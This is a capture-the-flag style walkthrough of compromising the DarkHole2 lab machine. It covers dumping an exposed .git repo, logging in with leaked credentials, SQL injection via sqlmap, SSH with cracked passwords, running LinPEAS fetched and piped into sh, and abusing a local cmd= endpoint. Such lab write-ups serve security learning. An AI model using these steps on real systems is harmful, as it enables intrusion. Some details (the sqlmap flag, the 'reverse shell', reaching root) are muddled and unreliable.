# DarkHole2

As always, starting my lab with a netdiscover command to see what machines are currently running in my network. I know the **192.168.19.129** IP is the victim machine since the other IPs are my machines that are up and running in a homelab.

<img width="1280" height="392" alt="Kali-2026-03-14-09-10-14" src="https://github.com/user-attachments/assets/cbc303c5-15cc-44d6-89a1-cf3e41f21cee" />

I then run a nmap scan to see what ports are open: **nmap -Pn -sS -sC --script vuln 192.168.19.129**. Ports 22 and 80 are open. What's interesting is that there is an exposed route **/.git/** under port 80.

<img width="1718" height="920" alt="kali-linux-2025 4-vmware-amd64-2026-03-13-14-40-20" src="https://github.com/user-attachments/assets/ecd2aebd-1c21-4182-b060-3b3235abf915" />

<img width="1718" height="920" alt="kali-linux-2025 4-vmware-amd64-2026-03-13-14-52-58" src="https://github.com/user-attachments/assets/70a95d14-b335-4511-9d6b-1f615a0d1175" />

What I did from here was create a python env so I could install **git-dumper** which works similarly to wget but this tool works specifically for github repos. The **pip** command doesn't work in my terminal, hence why I created the env for this. I ran the following commands to create my env, activate it, and install git-dumper:

* python3 -m venv gitdumper-env
* source gitdumper-env/bin/activate
* pip install git-dumper

<img width="1718" height="920" alt="kali-linux-2025 4-vmware-amd64-2026-03-13-14-58-30" src="https://github.com/user-attachments/assets/a62a2017-d52d-4131-9577-7b7732423ba0" />

From here, I ran **git-dumper http://192.168.19.129/.git dumped_site** which created a folder called dumped_site/ and downloaded the exposed git repo there. 

<img width="1718" height="920" alt="kali-linux-2025 4-vmware-amd64-2026-03-13-15-46-24" src="https://github.com/user-attachments/assets/aa78decf-8f0b-448a-ac0a-1a9e914dd658" />

To find logs on previous commits done in this repo, I ran **git log** which showed 3 commits. One was indicating that the user added default credentials into a php file. I then used **git show a4d900** which showed me the changes the user made in this commit. 

<img width="1718" height="920" alt="kali-linux-2025 4-vmware-amd64-2026-03-13-15-49-16" src="https://github.com/user-attachments/assets/8fda9a94-db5f-40b0-954a-3a5bedbc2ab6" />

I can see the email used for the dark hole website login is **lush@admin.com** and the password is **321**. From here, I can go back to the website and login with these credentials.

<img width="1280" height="800" alt="Kali-2026-03-15-10-53-07" src="https://github.com/user-attachments/assets/e3c1f436-80a6-40bf-a1f4-557953a3c9b6" />

Once I'm logged in, I do some digging around to see if I can find anything that could lead me to my next move. Looking in the URL as a logged in user, there is a parameter of **id** that has a value of 1. I had to do some research to see what tool would be best for this use case given the parameter. I found that sqlmap would be the best tool to use here as this automates the process of detecting and exploiting SQL injection flaws. Before using this tool, I would have to use Burp to capture an HTTP request since the parameter is only visible once I'm logged in so I need the cookie to set the connection.

<img width="1718" height="920" alt="kali-linux-2025 4-vmware-amd64-2026-03-13-15-58-11" src="https://github.com/user-attachments/assets/3d8c4e27-6b09-4a89-a85d-7e0916c99686" />

<img width="1280" height="800" alt="Kali-2026-03-15-11-06-04" src="https://github.com/user-attachments/assets/7663aee2-c910-4a97-9c79-767c5ff37dc7" />

After capturing the HTTP request and then saving it as a file, I can run **sqlmap -r dark --dump-run**. The -r is used to read the file which I named dark.

<img width="1280" height="800" alt="Kali-2026-03-15-11-31-26" src="https://github.com/user-attachments/assets/bd971dcf-d75b-4fe0-bb45-19b8eda6ffd4" />

During the scan, the injections are successful and return two tables, a user table and a ssh table. This worked so I can now ssh into jehad's account. I run the command **ssh jehad@192.168.19.129**, input the password **fool** and I'm in the account.

<img width="1280" height="800" alt="Kali-2026-03-15-12-21-51" src="https://github.com/user-attachments/assets/2ce61d73-21c2-4916-8c09-959fe20e1ae5" />

Now that I have access to an account, it's time for privilege escalation. I switched to the tmp folder and tried to run the Linpeas script: **curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh**. This is a script that searches for potential paths to elevate privileges on Linux hosts and highlights them for a better understanding of those instances with potential exploits. This is my first time using this which was really insightful and I will definitely be using this again in other labs.

<img width="1280" height="800" alt="Kali-2026-03-15-12-46-55" src="https://github.com/user-attachments/assets/f556ce95-3922-4e7a-83ef-0fd7bf16b8fa" />

<img width="1280" height="800" alt="Kali-2026-03-15-12-56-01" src="https://github.com/user-attachments/assets/512b8cbb-4c79-4e62-bfe1-6a6af482618e" />

<img width="1280" height="800" alt="Kali-2026-03-15-12-56-13" src="https://github.com/user-attachments/assets/4e136d0b-1ade-4458-a9ff-126bd5476727" />

<img width="1280" height="800" alt="Kali-2026-03-15-12-58-00" src="https://github.com/user-attachments/assets/560d2866-d0a1-4622-9df8-c2842f345a60" />

When listing the files in jehad's directory, there is a bash history file which I read and found this which created a reverse shell: **http://127.0.0.1:9999/?cmd=id**

<img width="1280" height="800" alt="Kali-2026-03-15-16-10-37" src="https://github.com/user-attachments/assets/d2696d16-aefc-4198-abe9-787ac2394397" />

<img width="1280" height="800" alt="Kali-2026-03-15-16-16-01" src="https://github.com/user-attachments/assets/441e8094-ab48-4957-ab9c-f5469139e2ed" />

I encoded this command and got the password to ssh into losy's account:

<img width="1280" height="800" alt="Kali-2026-03-15-16-17-05" src="https://github.com/user-attachments/assets/de60a762-c935-4167-84f9-5116a0074bc2" />


I was able to log into losy's account successfully. I create a more interactive shell by running **python3 -c 'import os; os.system("/bin/sh")'**. I then used the whoami command to verify I was in the root user's account. I finally changed the directory I was in to the root directory which I saw the root.txt file was in.

<img width="1280" height="800" alt="Kali-2026-03-15-16-20-04" src="https://github.com/user-attachments/assets/589b62a2-3be4-4d8e-a80d-2ec3e30b296a" />

<img width="1280" height="800" alt="Kali-2026-03-15-16-21-43" src="https://github.com/user-attachments/assets/51363c22-6518-4764-95c1-4fd20b384ee8" />
